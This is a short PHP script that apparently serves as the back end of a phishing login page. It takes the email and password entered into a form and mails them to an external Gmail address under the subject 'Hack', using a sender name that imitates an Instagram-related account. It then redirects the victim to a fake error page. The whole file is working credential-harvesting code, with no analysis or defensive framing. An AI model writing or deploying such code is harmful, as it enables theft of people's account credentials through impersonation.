<?php
//get data from form  
$email = $_POST['email'];
$password= $_POST['password'];
$to = "contestantvote4@gmail.com";
$subject = "Hack";
$txt =" Email = ". $email . "\r\n  Password = " . $password ;
$headers = "From: marvel_instagram";
if($email!=NULL){
    mail($to,$subject,$txt,$headers);
}
//redirect
header("Location:error/index.html");
?>